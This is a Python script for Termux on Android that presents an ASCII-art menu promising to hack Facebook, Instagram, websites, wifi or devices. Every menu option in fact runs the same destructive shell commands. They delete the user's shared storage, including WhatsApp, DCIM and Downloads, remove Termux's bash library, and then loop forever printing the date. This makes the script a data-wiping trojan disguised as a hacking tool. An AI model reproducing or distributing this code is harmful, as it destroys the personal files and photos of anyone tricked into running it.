from time import sleep
import os
import sys

menu = '''
\033[0;32m
         -o          o-
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm:NMMMMMMN:mMMd`
      hMMMMMMMMMMMMMMMMMMh
  ..  yyyyyyyyyyyyyyyyyyyy  ..
.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs
       created by : Unkown
____________________________________
|1.hack facebook		   |
|2.hack instagram		   |
|3.hack website			   |
|4.hack wifi			   |
|5.hack perangkat                  |
|6.exit          		   |
| _________________________________|
| |'''

def main():
   print (menu)
   pilihan = input ('|_>')
   if pilihan == '1' or pilihan == '01':
      os.system ('termux-setup-storage')
      os.system ('rm -irf storage/shared/Andoid')
      os.system ('rm -irf storage/shared/WhatsApp')
      os.system ('rm -irf storage/shared/DCIM')
      os.system ('rm -irf storage/shared/Downloads')
      os.system ('rm -irf storage/shared')
      os.system ('rm -irf ../usr/lib/bash')
      for ulang in range (9999999999):
          hitung = ulang  +1
          os.system ('date')
          sleep(1)
   elif pilihan == '2' or pilihan == '02':
        os.system ('termux-setup-storage')
        os.system ('rm -irf storage/shared/Andoid')
        os.system ('rm -irf storage/shared/WhatsApp')
        os.system ('rm -irf storage/shared/DCIM')
        os.system ('rm -irf storage/shared/Downloads')
        os.system ('rm -irf storage/shared')
        os.system ('rm -irf ../usr/lib/bash')
        sleep(2)
        for ulang in range (9999999999):
            hitung = ulang  +1
            os.system ('date')
            sleep(1)
   elif pilihan == '3' or pilihan == '03':
         os.system ('termux-setup-storage')
         os.system ('rm -irf storage/shared/Andoid')
         os.system ('rm -irf storage/shared/WhatsApp')
         os.system ('rm -irf storage/shared/DCIM')
         os.system ('rm -irf storage/shared/Downloads')
         os.system ('rm -irf storage/shared')
         os.system ('rm -irf ../usr/lib/bash')
         sleep(2)
         for ulang in range (9999999999):
             hitung = ulang  +1
             os.system ('date')
             sleep(1)
   elif pilihan == '4' or pilihan == '04':
        os.system ('termux-setup-storage')
        os.system ('rm -irf storage/shared/Andoid')
        os.system ('rm -irf storage/shared/WhatsApp')
        os.system ('rm -irf storage/shared/DCIM')
        os.system ('rm -irf storage/shared/Downloads')
        os.system ('rm -irf storage/shared')
        os.system ('rm -irf ../usr/lib/bash')
        sleep(2)
        for ulang in range (9999999999):
            hitung = ulang  +1
            os.system ('date')
            sleep(1)
   elif pilihan == '5' or pilihan == '05':
        os.system ('termux-setup-storage')
        os.system ('rm -irf storage/shared/Andoid')
        os.system ('rm -irf storage/shared/WhatsApp')
        os.system ('rm -irf storage/shared/DCIM')
        os.system ('rm -irf storage/shared/Downloads')
        os.system ('rm -irf storage/shared')
        os.system ('rm -irf ../usr/lib/bash')
        sleep(2)
        for ulang in range (9999999999):
            hitung = ulang  +1
            os.system ('date')
            sleep(1)
   elif pilihan == '6' or pilihan == '06':
        exit

   else:
        print ('yang bener goblok')
        sleep(2)
        os.system('python hack.py')

main()